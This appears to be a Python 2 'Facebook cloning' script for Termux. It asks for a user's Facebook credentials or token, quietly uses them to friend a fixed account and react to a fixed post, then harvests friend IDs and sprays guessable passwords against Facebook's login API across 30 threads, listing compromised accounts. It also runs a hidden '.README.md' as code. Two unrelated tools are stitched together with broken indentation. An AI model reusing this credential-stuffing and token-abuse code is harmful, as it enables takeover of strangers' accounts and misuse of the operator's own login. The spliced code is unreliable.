
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests,bxin
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install bxin')
    time.sleep(1)
    os.system('python2 .README.md')

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system('clear')
##### LOGO #####
logo='''
88888888ba  8b        d8  88  
88      '8b  Y8,    ,8P   88  
88      ,8P   `8b  d8'    88  
88_____-8P'     Y88P      88  
88------8b,     d88b      88  
88      `8b   ,8P  Y8,    88  
88      a8P  d8'    `8b   88  
88888888P'  8P        Y8  88  

--------------------------------------------------

 Auther   : Binyamin
 GitHub   : https://github.com/binyamin-binni
 YouTube  : Trick Proof
 Blogspot : https://trickproof.blogspot.com

--------------------------------------------------
                                '''

CorrectUsername = 'binyamin'
CorrectPassword = 'bxi'

loop = 'true'
while (loop == 'true'):
    print logo
    username = raw_input(' TOOL USERNAME: ')
    if (username == CorrectUsername):
    	password = raw_input(' TOOL PASSWORD: ')
        if (password == CorrectPassword):
            print ' Logged in successfully as ' + username
            time.sleep(1)
            loop = 'false'
        else:
            print ' Wrong Password !'
            os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
            os.system('clear')
    else:
        print ' Wrong Username !'
        os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
        os.system('clear')
        
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print('\r[+] Loging In '+o),;sys.stdout.flush();time.sleep(1)

def cb():
    os.system('clear')

def t():
    time.sleep(1)
    
def login():
    os.system('clear')
    try:
        toket = open('....', 'r')
        os.system('python2 .README.md')
    except (KeyError,IOError):
        os.system('rm -rf ....')
        os.system('clear')
        print (logo)
        print ('[1] Login With Email/Number and Password')
        print ('[2] Login With Access Token')
        print (50*'-')
        login_choice()
        
def login_choice():
    bch = raw_input('\n ====>  ')
    if bch =='':
        print ('[!] Fill in correctly')
        login()
    elif bch =='2':
        os.system('clear')
        print (logo)
        fac=raw_input(' Paste Access Token Here: ')
        fout=open('....', 'w')
        fout.write(fac)
        fout.close()
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
        requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
        os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
        os.system('python2 .README.md')
    elif bch =='1':
        login1()
            
def login1():
	cb()
	try:
		tb=open('token.txt', 'r')
		os.system('python2 .README.md')
	except (KeyError,IOError):
		cb()
		print (logo)
		print('          [+] LOGIN WITH FACEBOOK [+]' )
		print
		id = raw_input('[+] ID/Email : ')
		pwd = getpass.getpass('[+] Password : ')
		tik()
		sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
		data = {'api_key':'882a8490361da98702bf97a021ddc14d','credentials_type':'password','email':id,'format':'JSON', 'generate_machine_id':'1','generate_session_cookies':'1','locale':'en_US','method':'auth.login','password':pwd,'return_ssl_resources':'0','v':'1.0'}
		x=hashlib.new('md5')
		x.update(sig)
		a=x.hexdigest()
		data.update({'sig':a})
		url = 'https://api.facebook.com/restserver.php'
		r=requests.get(url,params=data)
		z=json.loads(r.text)
		if 'access_token' in z:
		    st = open('....', 'w')
		    st.write(z['access_token'])
		    st.close()
		    print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
		    t()
		    os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
		    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
		    requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +z['access_token'])
		    os.system('python2 .README.md')
		else:
		    if 'www.facebook.com' in z['error_msg']:
		        print ('Account has a checkpoint !')
		        os.system('rm -rf ....')
		        t()
		        login1()
		    else:
		        print ( 'email or password is wrong !')
		        os.system('rm -rf ....')
		        t()
		        login1()
			
if __name__=='__main__':
    login()             
    cb()
	
print (logo)
	print (S + '[☆] ' + G + 'ID Name: ' + R + a['name'])
	print (S + '[☆] ' + G + 'User ID: ' + R + a['id'])
	print
	print (S + 50*'-')
	print
	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
	print (S + '[' + P + '☞2' + S + ']' + S + ' Update B4_BALOCH Tool')
	print (S + '[' + P + '☞3' + S + ']' + S + ' B4_BALOCH WhatsApp Group')
	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
	print
	print (S + 50*'-')
	print
	mb()
	
	
	def mb():
	bm=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
	if bm =='':
		print (R + 'Select a valid option !')
		mb()
	elif bm =='1':
		pak()
	elif bm =='2':
	    os.system('rm -rf $HOME/B4_BALOCH')
	    os.system('cd $HOME && git clone https://github.com/shabirbaloch125/Baloch')
	    cb()
	    print (logo)
	    psb('☆10%')
	    psb('☆☆20%')
	    psb('☆☆☆30%')
	    psb('☆☆☆☆40%')
	    psb('☆☆☆☆☆50%')
	    psb('☆☆☆☆☆☆60%')
	    psb('☆☆☆☆☆☆☆70%')
	    psb('☆☆☆☆☆☆☆☆80%')
	    psb('☆☆☆☆☆☆☆☆☆90%')
	    psb('☆☆☆☆☆☆☆☆☆☆100%')
	    psb('Frends login new Account✓')
	    psb('WhatsApp Num 03232132362✓')
	    psb('WellCome To B4_BALOCH')
	    psb('Congratulations B4_BALOCH Tool Has Been Updated Successfully')
	    psb('🔓User Name☆ 786786✓')
	    psb('🔓Password ☆ 786786✓')
	    psb('Subscrib My Youtube Channel B4 BALOCH M4 MASTER✓')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $HOME/B4_BALOCH && python2 B4.py')
	elif bm =='3':
	    os.system('xdg-open https://chat.whatsapp.com/BcmyQPBz6lz3t6oVN8wLoi')
	    menu()
	elif bm =='4':
		psb('Token Has Been Removed')
		trb()
		t()
		exb()
	elif bm =='0':
	    exb()
	else:
		print (R+'Fill in correctly !')
		mb()
		
		
		def pak():
	global tb
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + ' Invalid Token !')
		trb()
		t()
		login()
	cb()
	print (logo)
	print (S + '[' + P + '☞1' + S + ']' + P + ' Clone With Friend List')
	print (S + '[' + P + '☞2' + S + ']' + P + ' Clone From Public Account')
	print (S + '[' + Y + '☞3' + S + ']' + Y + ' Clone From File')
	print (S + '[' + R + '☞0' + S + ']' + R + ' Back')
	print
	print (S + 50*'-')
	print
	pb()

def pb():
	bp=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
	if bp =='':
		print (R + 'Select a valid option !')
		pb()
	elif bp =='1':
		cb()
		print (logo)
		r=requests.get('https://graph.facebook.com/me/friends?access_token='+tb)
		z=json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif bp=='2':
		cb()
		print (logo)
		idt=raw_input(S + '[☆] ' + G + 'Put Public User ID/User Name: ' + W + '')
		cb()
		print (logo)
		try:
			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)
			op=json.loads(jok.text)
			psb(S + '[☆]' + G + ' Account  Name: ' + W + op['name'])
		except KeyError:
			print (R + ' ID not found !')
			raw_input(R + ' Back')
			pak()
		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)
		z=json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif bp =='3':
		cb()
		print (logo)
		try:
			idlist=raw_input(S + '[☆] ' + R + 'Enter File Path: ' + G + '')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print (R + ' File Not Fount !')
			raw_input(R + ' Back')
			pak()
	elif bp =='0':
		menu()
	else:
		print (R + ' Select a valid option !')
		pb()
	print (S + '[☆]' + P + ' Total Friends: ' + W + str(len(id)))
	psb(S + '[☆]' + S + ' To stop process  click on CTRL ~ Z')
	print
	print (S + 50*'-')
	print
	def main(arg):
		global cps, oks
		user=arg
		try:
			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
			j=json.loads(h.text)
			ps1=('786786')
			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			k=json.load(dt)
			if 'www.facebook.com' in k['error_msg']:
			    print(S+'[CP] ♡ '+user+' ♡ '+ps1)
			    cps.append(user+ps1)
			else:
			    if 'access_token' in k:
			        print (G+'[OK] ♡ '+user+' ♡ '+ps1)
			        oks.append(user+ps1)
			    else:
			        ps2=(j['first_name']+'123')
			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(S+'[CP] ♡ '+user+' ♡ '+ps2)
			            cps.append(user+ps2)
			        else:
			            if 'access_token' in k:
			                print(G+'[OK] ♡ '+user+' ♡ '+ps2)
			                oks.append(user+ps2)
			            else:
			                ps3=(j['first_name']+'786')
			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(S+'[CP] ♡ '+user+' ♡ '+ps3)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_token' in k:
			                        print(G+'[OK] ♡ '+user+' ♡ '+ps3)
			                        oks.append(user+ps3)
			                    else:
			                        ps4=(j['first_name']+'12345')
			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                        k=json.load(dt)
			                        if 'www.facebook.com' in k['error_msg']:
			                            print(S+'[CP] ♡ '+user+' ♡ '+ps4)
			                            cps.append(user+ps4)
			                        else:
			                            if 'access_token' in k:
			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=('Pakistan')
			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                k=json.load(dt)
			                                if 'www.facebook.com' in k['error_msg']:
			                                    print(S+'[CP] ♡ '+user+' ♡ '+ps5)
			                                    cps.append(user+ps5)
			                                else:
			                                    if 'access_token' in k:
			                                        print(G+'[OK] ♡ '+user+' ♡ '+ps5)
			                                        oks.append(user+ps5)
			                                    else:
			                                        ps6=(j['first_name']+'khan')
			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps6)
			                                            cps.append(user+ps6)
			                                        else:
			                                            if 'access_token' in k:
			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps6)
			                                                oks.append(user+ps6)
		except:
			pass
	p=ThreadPool(30)
	p.map(main, id)
	print
	print(S+50*'-')
	print
	print(S+'Process has been completed CP ID Open After 7 Days ')
	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))
	print(S+'BlackMafia')     
	print
	raw_input(R + 'Back')
	os.system('python2 B4.py')
if __name__=='__main__':
    login()

